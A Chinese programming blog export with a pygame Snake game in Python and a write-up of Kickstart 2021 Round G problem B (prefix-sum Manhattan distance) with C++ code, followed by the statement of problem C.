    <content><![CDATA[<p>最近在刷leetcode的时候，发现有几个涉及到游戏的题目，比较有意思，特别想把他们用界面能够展示出来，所以到网上搜了某个程序员github的源代码，然后照着改了一下，先把贪吃蛇这个小游戏做完成了，后续还会继续把扫地机器人这个小游戏用pygame做出来，模拟相关的算法来解题，我觉得还是挺有意思，用图形化的界面把游戏的过程展示出来.</p>
<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><h3 id="游戏功能"><a href="#游戏功能" class="headerlink" title="游戏功能"></a>游戏功能</h3><ol>
<li>设计的游戏的时候，把<code>snake</code>和<code>food</code>的逻辑全部剥离出来，跟游戏场景本身无关；</li>
<li>主要设计了两个类，一个为<code>snake</code>类，另一个为<code>game</code>类，<code>game</code>主要负责处理窗口初始化，刷新，键盘事件捕获，速度控制等等；<code>snake</code>全部独立与<code>game</code>,<code>snake</code>类全部负责蛇本身的行走，食物的处理逻辑.通过上下左右控制蛇的行走，通过+&#x2F;-控制蛇的行走速度.</li>
<li>相关动画如下:</li>
</ol>
<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.<span class="built_in">locals</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line">LIGHT = (<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line">DARK = (<span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>)      <span class="comment"># 蛇的颜色</span></span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)           <span class="comment"># 网格线颜色</span></span><br><span class="line">RED = (<span class="number">200</span>, <span class="number">30</span>, <span class="number">30</span>)         <span class="comment"># 红色，GAME OVER 的字体颜色</span></span><br><span class="line">BGCOLOR = (<span class="number">40</span>, <span class="number">40</span>, <span class="number">60</span>)      <span class="comment"># 背景色</span></span><br><span class="line">GAMEOVER = <span class="number">0</span></span><br><span class="line">GAMERUN = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Snake</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,w,h</span>):</span><br><span class="line">        self.speed = <span class="number">0.1</span></span><br><span class="line">        self.snake = [(<span class="number">0</span>,<span class="number">0</span>)]</span><br><span class="line">        self.body = <span class="built_in">set</span>(self.snake)</span><br><span class="line">        self.head = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        self.direction = <span class="string">&#x27;R&#x27;</span></span><br><span class="line">        self.snakeColor = DARK</span><br><span class="line">        self.foodColor = RED</span><br><span class="line">        self.foods = <span class="built_in">set</span>()</span><br><span class="line">        self.state = GAMERUN</span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.w = w</span><br><span class="line">        self.h = h</span><br><span class="line">        <span class="comment">#initial add 10 foods</span></span><br><span class="line">        self.add_food()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_snake_color</span>(<span class="params">self,rgb</span>):</span><br><span class="line">        self.color = rgb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_snake_direction</span>(<span class="params">self,<span class="built_in">dir</span></span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dir</span> == <span class="string">&#x27;L&#x27;</span> <span class="keyword">and</span> self.direction == <span class="string">&#x27;R&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">           (<span class="built_in">dir</span> == <span class="string">&#x27;R&#x27;</span> <span class="keyword">and</span> self.direction == <span class="string">&#x27;L&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">           (<span class="built_in">dir</span> == <span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> self.direction == <span class="string">&#x27;D&#x27;</span>) <span class="keyword">or</span> \</span><br><span class="line">           (<span class="built_in">dir</span> == <span class="string">&#x27;D&#x27;</span> <span class="keyword">and</span> self.direction == <span class="string">&#x27;U&#x27;</span>):</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        self.direction = <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.snake) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">snake_move</span>(<span class="params">self</span>):</span><br><span class="line">        d = &#123;<span class="string">&quot;L&quot;</span>:(<span class="number">0</span>,-<span class="number">1</span>),<span class="string">&quot;R&quot;</span>:(<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;U&quot;</span>:(-<span class="number">1</span>,<span class="number">0</span>),<span class="string">&quot;D&quot;</span>:(<span class="number">1</span>,<span class="number">0</span>)&#125;</span><br><span class="line">        x = self.head[<span class="number">0</span>] + d[self.direction][<span class="number">0</span>]</span><br><span class="line">        y = self.head[<span class="number">1</span>] + d[self.direction][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span>  x &gt;= self.h <span class="keyword">or</span> y &gt;= self.w:</span><br><span class="line">            self.state = GAMEOVER</span><br><span class="line">            self.scroe = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        curr = (x,y)</span><br><span class="line">        self.head = (x,y)</span><br><span class="line">        self.snake.append(curr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.foods) &gt; <span class="number">0</span> <span class="keyword">and</span> curr <span class="keyword">in</span> self.foods:</span><br><span class="line">            self.foods.remove(curr)</span><br><span class="line">            self.body.add(curr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.body.remove(self.snake[<span class="number">0</span>])</span><br><span class="line">            self.snake.pop(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> curr <span class="keyword">in</span> self.body:</span><br><span class="line">                self.state = GAMEOVER</span><br><span class="line">                self.scroe = -<span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.body.add(curr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.foods) == <span class="number">0</span>:</span><br><span class="line">            self.add_food()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.snake)-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_food</span>(<span class="params">self</span>):</span><br><span class="line">        nums = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums):</span><br><span class="line">            self.foods.add(self.creat_food())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">creat_food</span>(<span class="params">self</span>):</span><br><span class="line">        food_x = random.randint(<span class="number">0</span>,self.h)</span><br><span class="line">        food_y = random.randint(<span class="number">0</span>,self.w)</span><br><span class="line">        <span class="keyword">while</span> (food_x, food_y) <span class="keyword">in</span> self.body <span class="keyword">or</span> (food_x, food_y)  <span class="keyword">in</span> self.foods:</span><br><span class="line">            <span class="comment"># 如果食物出现在蛇身上 ，则重来</span></span><br><span class="line">            food_x = random.randint(<span class="number">0</span>,self.w)</span><br><span class="line">            food_y = random.randint(<span class="number">0</span>,self.h)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (food_x,food_y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,w,h,sz = <span class="number">20</span></span>):</span><br><span class="line">        self.width = w</span><br><span class="line">        self.high = h</span><br><span class="line">        self.textHigh = <span class="number">2</span></span><br><span class="line">        self.sz = sz</span><br><span class="line">        self.line = <span class="number">1</span></span><br><span class="line">        self.backGround = BGCOLOR</span><br><span class="line">        self.snakeColor = DARK</span><br><span class="line">        self.foodColor = RED</span><br><span class="line">        self.textColor = RED</span><br><span class="line">        self.state = GAMERUN</span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.speed = <span class="number">1.0</span></span><br><span class="line">        self.last_move_time = time.time()</span><br><span class="line">        self.snake = Snake(w,h-self.textHigh)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#init game</span></span><br><span class="line">        pygame.init()</span><br><span class="line">        self.screen = pygame.display.set_mode((w*sz, h*sz))</span><br><span class="line">        pygame.display.set_caption(<span class="string">&#x27;Gluttonous snake&#x27;</span>)</span><br><span class="line">        self.font1 = pygame.font.SysFont(<span class="string">&#x27;SimHei&#x27;</span>, <span class="number">24</span>)  <span class="comment"># 得分的字体</span></span><br><span class="line">        self.font2 = pygame.font.SysFont(<span class="string">&#x27;arial&#x27;</span>, <span class="number">72</span>)  <span class="comment"># GAME OVER 的字体</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">text_draw</span>(<span class="params">self</span>):</span><br><span class="line">        imgText = self.font1.render(<span class="string">f&#x27;speed: <span class="subst">&#123;<span class="built_in">int</span>(<span class="number">1</span>/self.speed)&#125;</span>&#x27;</span>,<span class="literal">True</span>,pygame.Color(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        self.screen.blit(imgText,(<span class="number">160</span>,<span class="number">10</span>))</span><br><span class="line">        imgText = self.font1.render(<span class="string">f&#x27;score: <span class="subst">&#123;self.score&#125;</span>&#x27;</span>,<span class="literal">True</span>,pygame.Color(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        self.screen.blit(imgText,(self.width*self.sz-<span class="number">160</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">game_draw</span>(<span class="params">self</span>):</span><br><span class="line">        self.screen_draw()</span><br><span class="line">        self.snake_draw()</span><br><span class="line">        self.food_draw()</span><br><span class="line">        self.line_draw()</span><br><span class="line">        self.text_draw()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speed_up</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.speed &lt; <span class="number">0.1</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.speed = self.speed - <span class="number">0.05</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speed_down</span>(<span class="params">self</span>):</span><br><span class="line">        self.speed = self.speed + <span class="number">0.05</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set background</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">screen_draw</span>(<span class="params">self</span>):</span><br><span class="line">        self.screen.fill(self.backGround)        </span><br><span class="line"></span><br><span class="line">    <span class="comment"># set snake</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">snake_draw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> x,y <span class="keyword">in</span> self.snake.body:</span><br><span class="line">            pygame.draw.rect(self.screen,self.snakeColor,(y*self.sz,(x+self.textHigh)*self.sz,self.sz,self.sz),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># line draw</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">line_draw</span>(<span class="params">self</span>):</span><br><span class="line">        pygame.draw.rect(self.screen,LIGHT,(<span class="number">0</span>,<span class="number">0</span>,self.width*self.sz,self.textHigh*self.sz),<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(self.width):</span><br><span class="line">            p1 = (x*self.sz,self.textHigh*self.sz)</span><br><span class="line">            p2 = (x*self.sz, self.high*self.sz)</span><br><span class="line">            pygame.draw.line(self.screen, BLACK,p1, p2, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(self.textHigh,self.high):</span><br><span class="line">            p1 = (<span class="number">0</span>,y*self.sz)</span><br><span class="line">            p2 = (self.width*self.sz, y*self.sz)</span><br><span class="line">            pygame.draw.line(self.screen, BLACK, p1, p2, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set food</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">food_draw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> (x,y) <span class="keyword">in</span> self.snake.foods:</span><br><span class="line">            pygame.draw.rect(self.screen,self.foodColor,(y*self.sz,(x+self.textHigh)*self.sz,self.sz,self.sz),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set screen</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scree_update</span>(<span class="params">self</span>):</span><br><span class="line">        pygame.display.update()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">game_over</span>(<span class="params">self</span>):</span><br><span class="line">        imgText = self.font2.render(<span class="string">f&#x27;game over&#x27;</span>,<span class="literal">True</span>,pygame.Color(<span class="number">200</span>,<span class="number">30</span>,<span class="number">30</span>))</span><br><span class="line">        self.screen.blit(imgText,(self.width/<span class="number">2</span>*self.sz-<span class="number">100</span>,self.high/<span class="number">2</span>*self.sz))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.game_draw()</span><br><span class="line">            self.scree_update()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">                <span class="keyword">if</span> event.<span class="built_in">type</span> == QUIT:</span><br><span class="line">                    sys.exit()</span><br><span class="line">                <span class="keyword">elif</span> event.<span class="built_in">type</span> == KEYDOWN:</span><br><span class="line">                    <span class="keyword">if</span> event.key <span class="keyword">in</span> (K_w, K_UP):</span><br><span class="line">                        self.snake.set_snake_direction(<span class="string">&#x27;U&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> event.key <span class="keyword">in</span> (K_s, K_DOWN):</span><br><span class="line">                        self.snake.set_snake_direction(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> event.key <span class="keyword">in</span> (K_a, K_LEFT):</span><br><span class="line">                        self.snake.set_snake_direction(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> event.key <span class="keyword">in</span> (K_d, K_RIGHT):</span><br><span class="line">                        self.snake.set_snake_direction(<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> event.key <span class="keyword">in</span> (K_PLUS, K_EQUALS):</span><br><span class="line">                        self.speed_up()</span><br><span class="line">                    <span class="keyword">elif</span> event.key <span class="keyword">in</span> (K_MINUS,K_UNDERSCORE):</span><br><span class="line">                        self.speed_down()</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> self.state <span class="keyword">is</span> <span class="keyword">not</span> GAMEOVER:</span><br><span class="line">                curTime = time.time()</span><br><span class="line">                <span class="keyword">if</span> curTime - self.last_move_time &gt; self.speed:</span><br><span class="line">                    res = self.snake.snake_move()</span><br><span class="line">                    <span class="keyword">if</span> res &lt; <span class="number">0</span>:</span><br><span class="line">                        self.state = GAMEOVER</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self.last_move_time = curTime</span><br><span class="line">                        self.score = res </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.state == GAMEOVER:</span><br><span class="line">                self.game_over()</span><br><span class="line">                self.scree_update()</span><br><span class="line"></span><br><span class="line">game = Game(<span class="number">40</span>,<span class="number">30</span>)</span><br><span class="line">game.run()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>kickstart 2021 round G</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/56/</url>
    <content><![CDATA[<h1 id="kickstart-2021-round-G"><a href="#kickstart-2021-round-G" class="headerlink" title="kickstart 2021 round G"></a>kickstart 2021 round G</h1><p><code>kickstart</code>的算法果真还是非常的有难度,比力扣的难度大太多了.感觉还是智商不够，现在感觉 $\textit{leetcode}$ 上面只有 $\textit{hard}$ 题目比较感兴趣了，中等难度及以下，感觉基本上就是重复了。感觉每次比赛的第二题和第三题的质量非常高，非常适合新手练习和比赛．</p>
<h3 id="problem-B"><a href="#problem-B" class="headerlink" title="problem B"></a>problem B</h3><p>With online classes in full swing, it is important for Grace to take breaks and keep herself hydrated at all times. She has decided to place a water bottle in her room in the most convenient place. This means that the position of this water bottle should be close to all the places in the room where she generally hangs out like the study desk, bed and coffee table among other places.</p>
<p>The room is represented in the form of a coordinate plane. The number of steps Grace needs to go from Point A to Point B is equal to the Manhattan distance between the 2 points. This means, Grace can only walk parallel to the axes of the coordinate plane and with each step, she can move one unit in either of the four directions.</p>
<p>Can you help her find a position in the room to keep the bottle, such that the sum of steps from the bottle to all her favourite furniture pieces will be minimum?</p>
<p><strong>Notes</strong>:</p>
<ul>
<li>All the furniture (like study desk, bed, or coffee table) can be represented as rectangles of non-zero area in the plane with edges parallel to the axes.</li>
<li>It is possible for furniture pieces to overlap, as she likes to work on her bed-table too.</li>
<li>Assume that Grace can simply pass through the furniture while walking and does not need to go around them.<br><strong>Input</strong><br>The first line of the input gives the number of test cases, T. T test cases follow.<br>The first line of each test case contains an integer K which represents the number of objects in Grace’s room.<br>K lines follow, each of them describing one object. The i-th line contains four integers, xi,1, yi,1, xi,2, yi,2, where (xi,1, yi,1) represents coordinates of the bottom left corner and (xi,2, yi,2) represents coordinates of the top right corner of the i-th rectangular object.<br><strong>Output</strong><br>For each test case, output one line containing Case #i: x y, where i is the test case number (starting from 1) and x and y are coordinates of the water bottle such that the sum of steps from these coordinates to all the furniture pieces will be minimum.<br>Note, the bottle can lie on the floor or on top of any furniture but should be placed on integer coordinates only.<br>If multiple solutions exist, output the one with minimum x coordinate, if multiple solutions have the same x coordinate output the one with minimum y coordinate.</li>
</ul>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000004362d6/00000000008b3a1c">https://codingcompetitions.withgoogle.com/kickstart/round/00000000004362d6/00000000008b3a1c</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  前缀和</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>题意大概是说有一堆物体为长方形，散落在二维坐标系中，我们在二维坐标系中找打一个点使得该点到所有物体的曼哈顿距离之和最小．题目难度本身不是特别难，但是感觉有许多值得思考的地方，特别锻炼思维能力．</li>
<li>题目看似很难,实际上我们将曼哈顿距离分解为横坐标与总坐标,横坐标与纵坐标之间时间上处于独立的关系,因此我们可以分别求出横坐标与纵坐标.点$P&#x3D;(x,y)$到矩形 $R$ 的曼哈顿距离计算公式为 $d(P,R) &#x3D; max(x_{1}−x,x−x_{2},0) + max(y_{1}−y,y−y_{2},0)$, 其中矩形的左下端点为$(x_{1}, y_{1})$, 矩形的右上端点为$(x_{2}, y_{2})$.我们将所有的横坐标进行排列，假设分布如下：<br><img src="https://i.loli.net/2021/10/27/5SxOZ7VNnGRX1Dm.png" alt="1"><br>对于给定的 $x$ 我们只需要找到所有右侧小于 $x$ 的矩形数目 $a(x)$, 以及找到所有左侧大于 $x$ 的矩形数目 $b(x)$.我们可以知道它的计算公式为:<br>$$d(x) &#x3D; (a(x)\times x - \sum_{j&#x3D;0}^{a(x)}x_j) + (\sum_{i&#x3D;0}^{b(x)}x_i - b(x)\times x) \qquad (x_j &lt; x &lt; x_i)$$<br>对于给定的 $y$ 我们只需要找到所上边缘小于 $y$ 的矩形数目 $a(y)$, 以及找到所有下边缘大于 $y$ 的矩形数目 $b(y)$.我们可以知道它的计算公式为:<br>$$d(y) &#x3D; (a(y)\times y - \sum_{j&#x3D;0}^{a(y)}y_j) + (\sum_{i&#x3D;0}^{b(y)}y_i - b(y)\times y) \qquad (y_j &lt; y &lt; y_i)$$</li>
<li>我们可以找到最小的 $d(x) + d(y)$ 即可.我们可以依次遍历所有的可能的坐标，对于每个一个坐标 $x$ 我们依次求即可.</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度: $O(N\lg(N))$,其中 $N$ 为所有矩形物品的数目.</li>
<li>空间复杂度: $O(N)$,其中 $N$ 为所有矩形物品的数目.</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;ll,ll&gt; pll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    ll x1,y1,x2,y2;</span><br><span class="line">    ll x,y;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line">    vector&lt;ll&gt; px1;</span><br><span class="line">    vector&lt;ll&gt; px2;</span><br><span class="line">    vector&lt;ll&gt; py1;</span><br><span class="line">    vector&lt;ll&gt; py2;</span><br><span class="line">    <span class="function">vector&lt;ll&gt; <span class="title">sumx</span><span class="params">(k+<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;ll&gt; <span class="title">sumy</span><span class="params">(k+<span class="number">1</span>)</span></span>;</span><br><span class="line">    vector&lt;ll&gt; arrx;</span><br><span class="line">    vector&lt;ll&gt; arry;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2;</span><br><span class="line">        px1.<span class="built_in">push_back</span>(x1);</span><br><span class="line">        px2.<span class="built_in">push_back</span>(x2);</span><br><span class="line">        arrx.<span class="built_in">push_back</span>(x1);</span><br><span class="line">        arrx.<span class="built_in">push_back</span>(x2);</span><br><span class="line">        py1.<span class="built_in">push_back</span>(y1);</span><br><span class="line">        py2.<span class="built_in">push_back</span>(y2);</span><br><span class="line">        arry.<span class="built_in">push_back</span>(y1);</span><br><span class="line">        arry.<span class="built_in">push_back</span>(y2);</span><br><span class="line">    &#125;</span><br><span class="line">    ll distx = LLONG_MAX;</span><br><span class="line">    ll disty = LLONG_MAX;</span><br><span class="line">    <span class="built_in">sort</span>(px1.<span class="built_in">begin</span>(),px1.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(px2.<span class="built_in">begin</span>(),px2.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(py1.<span class="built_in">begin</span>(),py1.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(py2.<span class="built_in">begin</span>(),py2.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(arrx.<span class="built_in">begin</span>(),arrx.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(arry.<span class="built_in">begin</span>(),arry.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = k<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        sumx[i] = sumx[i+<span class="number">1</span>] + px1[i];</span><br><span class="line">        sumy[i] = sumy[i+<span class="number">1</span>] + py1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ll pre = <span class="number">0</span>;</span><br><span class="line">    ll l1 = <span class="number">0</span>;</span><br><span class="line">    ll l2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; arrx.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        <span class="keyword">while</span>(l2 &lt; k &amp;&amp; px2[l2] &lt;= arrx[i])&#123;</span><br><span class="line">            pre += px2[l2];</span><br><span class="line">            l2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l1 &lt; k &amp;&amp; px1[l1] &lt;= arrx[i]) &#123;</span><br><span class="line">            l1++;</span><br><span class="line">        &#125;</span><br><span class="line">        ll curr = l2*arrx[i] - pre + (sumx[l1] - (k-l1)*arrx[i]);</span><br><span class="line">        <span class="keyword">if</span>(curr &lt; distx) &#123;</span><br><span class="line">            distx = curr;</span><br><span class="line">            x = arrx[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    l1 = <span class="number">0</span>;</span><br><span class="line">    l2 = <span class="number">0</span>;</span><br><span class="line">    pre = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; arry.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        <span class="keyword">while</span> (l2 &lt; k &amp;&amp; py2[l2] &lt;= arry[i]) &#123;</span><br><span class="line">            pre += py2[l2];</span><br><span class="line">            l2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (l1 &lt; k &amp;&amp; py1[l1] &lt;= arry[i]) &#123;</span><br><span class="line">            l1++;</span><br><span class="line">        &#125;</span><br><span class="line">        ll curr = l2*arry[i] - pre + (sumy[l1] - (k-l1)*arry[i]);</span><br><span class="line">        <span class="keyword">if</span>(curr &lt; disty) &#123;</span><br><span class="line">            disty = curr;</span><br><span class="line">            y = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;y;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="problem-C"><a href="#problem-C" class="headerlink" title="problem C"></a>problem C</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Problem<br>Barbara goes to Alan’s banana farm, where the N banana trees are organized in one long line represented by an array B. The tree at position i has Bi banana bunches. Each tree has the same cost. Once Barbara buys a tree, she gets all the banana bunches on that tree.<br>Alan has a special rule: because he does not want too many gaps in his line, he allows Barbara to buy at most 2 contiguous sections of his banana tree line.</p>
<p>Barbara wants to buy some number of trees such that the total number of banana bunches on these purchased trees equals the capacity K of her basket. She wants to do this while spending as little money as possible. How many trees should she buy?</p>
<p><strong>Input</strong><br>The first line of the input gives the number of test cases, T. T test cases follow.<br>Each test case begins with a line containing two integers integer N, the number of trees on Alan’s farm, and K, the capacity of Barbara’s basket.<br>The next line contains N non-negative integers $B1,B2,…,BN$ representing array B, where the i-th integer represents the number of banana bunches on the i-th tree on Alan’s farm.<br><strong>Output</strong><br>For each test case, output one line containing Case #x: y, where x is the test case number (starting from 1) and y is the minimum number of trees Barbara must purchase to obtain K banana bunches using at most 2 contiguous sections of the farm, or -1 if it is impossible to do so.</p>
